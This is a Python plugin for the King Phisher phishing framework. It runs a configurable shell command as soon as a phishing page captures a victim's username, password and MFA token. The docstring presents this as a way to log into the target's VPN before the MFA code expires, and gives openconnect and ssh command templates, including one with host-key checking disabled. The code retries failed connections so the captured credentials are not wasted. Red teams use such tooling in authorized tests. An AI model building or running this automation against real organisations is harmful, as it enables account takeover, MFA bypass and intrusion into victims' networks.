import re
import shlex
import subprocess

from sqlalchemy import desc

import king_phisher.plugins as plugin_opts
import king_phisher.server.database.models as db_models
import king_phisher.server.plugins as plugins
import king_phisher.server.signals as signals


class Plugin(plugins.ServerPlugin):
    authors = ['Corey Gilks']
    title = 'The Commander'
    description = """
    Execute an action from the KP Server after new credentials are received. Originally this plugin was created to
    quickly authenticate to the targets VPN after new credentials are received. When the target is using
    MFA every second counts, so action must be taken quickly. Operators may be unable to respond fast enough therefore
    this plugin is needed.
    
    You can dynamically include the username, password and MFA values in your command by using the following python 
    format string syntax:

    {0} = Username
    {1} = Password
    {2} = MFA
    
    Requirements: 
    1. The command you choose must be executable by the "setuid_username" in your server_config.yml
    2. Commands should non-blocking. Commands that block will make the KP server hang. Use screen, &, etc..
    
    Local KP server execution:
    To execute openconnect on the KP server, do the following:
    1. Create vpn.sh in /opt/scripts/vpn.sh with the following contents (ensure you can sudo without your password):
        echo $2'\n'$3 | sudo openconnect -u $1 --passwd-on-stdin <TARGET VPN URL>
    
    2. In your server_config.yml add the following configuration:
          plugins:
            post_command:
              command: screen -dmS {0} bash -c "sh /opt/scripts/vpn.sh {0} {1} {2}"
    
    Now any submitted credentials will automatically create a screen session. The name of the screen session will be the
    username that was submitted. If no screen session exists after credentials were entered then the VPN tunnel was not 
    successfully established.
    
    Remote server execute:
    If you are concerned about opsec, you likely do not want to execute a VPN tunnel from your phishing infrastructure.
    In this case follow step 1 from "Local KP server execution" and then add this into your server_config.yml:
    
    post_command:
      command: 'ssh -i /<YOUR USER>/.ssh/key.pem -oStrictHostKeyChecking=no root@<ANOTHER HOST> screen -dmS {0} "sh /opt/scripts/vpn.sh {0} {1} {2}"'
      
    This will SSH into <ANOTHER HOST> using key.pem without the need to accept a new SSH key fingerprint. Then a new
    screen session is opened under the victims username. If no screen session exists after credentials were entered then 
    the VPN tunnel was not successfully established.
    """
    homepage = 'https://github.com/securestate/king-phisher-plugins'
    options = [
        plugin_opts.OptionString(
            'command',
            'Execute an arbitrary command from the KP server after receiving new credentials',
            default=None
        ),
        plugin_opts.OptionString(
            'mfa_required',
            'Require MFA before executing a command',
            default=True
        ),
        plugin_opts.OptionInteger(
            'username_len',
            'Maximum username length',
            default=104
        ),
        plugin_opts.OptionInteger(
            'mfa_token_len',
            'Maximum mfa token length',
            default=10
        ),
        plugin_opts.OptionInteger(
            'password_len',
            'Maximum password length',
            default=127
        ),
    ]
    req_min_version = '1.4.0'  # Whichever version implemented MFA
    version = '1.0'

    def initialize(self):
        self.logger.warning('Command will execute upon receiving credentials:\n' + self.config['command'])
        signals.db_session_inserted.connect(self.new_challenger_approaches, sender='credentials')
        return True

    def new_challenger_approaches(self, sender, targets, session):
        for event in targets:
            # Order by most recent datetime
            query = session.query(db_models.Credential).order_by(desc(db_models.Credential.submitted))
            query = query.filter_by(message_id=event.message_id)
            raw = query.first()

            username = raw.username
            password = raw.password
            mfa_token = raw.mfa_token

            self.logger.warning('New credentials submitted. Verifying..')
            if not username:
                self.logger.warning('No username submitted but someone posted a web response. Aborting')
                return
            else:
                username = raw.username.strip()
                self.logger.warning('Username: {0}'.format(username))

            if not password:
                self.logger.warning('No password submitted for {0}. Aborting'.format(username))
                return

            if not mfa_token:
                if self.config['mfa_required']:
                    self.logger.warning('MFA is required but no MFA submitted for {0}. Aborting'.format(username))
                    return
                mfa_token = ''
            else:
                mfa_token = raw.mfa_token.strip()

            if len(username) > self.config['username_len']:
                self.logger.warning('Username length is too long. Maximum is {0} but {1} was entered'.format(self.config['username_len'], len(username)))
                return

            if len(mfa_token) > self.config['mfa_token_len']:
                self.logger.warning('MFA length is too long. Maximum is {0} but {1} was entered'.format(self.config['mfa_token_len'], len(mfa_token)))
                return

            if len(password) > self.config['password_len']:
                self.logger.warning('Password length is too long. Maximum is {0} but {1} was entered'.format(self.config['password_len'], len(password)))
                return

            if '\\' in username:
                if len(username.split()) > 2:
                    self.logger.warning('Aborting due to too many backslashes in username: {0}'.format(username))
                    return
                username = username.split('\\')[-1]

            illegal_chars = ['/', '\\', '[', ']', ':', ';', '|', '=', ',', '+', '*', '?', '<', '>', ' ', '&', '!', '~', '#', '%', '^', '(', ')', '{', '}' '`']
            for illegal in illegal_chars:
                if illegal in username:
                    self.logger.warning('Aborting. Found illegal character in username: {0}'.format(illegal))
                    return
                if illegal in mfa_token:
                    self.logger.warning('Aborting. Found illegal character in MFA: {0}'.format(illegal))
                    return

            username = re.escape(username)
            password = re.escape(password)
            mfa_token = re.escape(mfa_token)

            # Execute command logic here
            self.logger.warn('Command:\n{0}'.format(self.config['command'].format(username, '<REDACTED>', mfa_token)))
            command = self.config['command'].format(username, password, mfa_token)
            command = shlex.split(command)

            while True:
                run = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
                if run.stdout:
                    self.logger.warning('Command returned output:\n{0}'.format(run.stdout.decode('utf-8')))
                    # Sometimes SSH connections fail. Wouldn't want to waste creds, so let's try again!
                    if b'Connection closed by remote host' in run.stdout:
                        self.logger.warning('SSH Connection failed. Trying again..')
                        continue
                elif run.stderr:
                    self.logger.warning('Command returned error:\n{0}'.format(run.stderr.decode('utf-8')))
                else:
                    self.logger.warning("Executed command. Nothing returned from stdout or stderr.")
                break
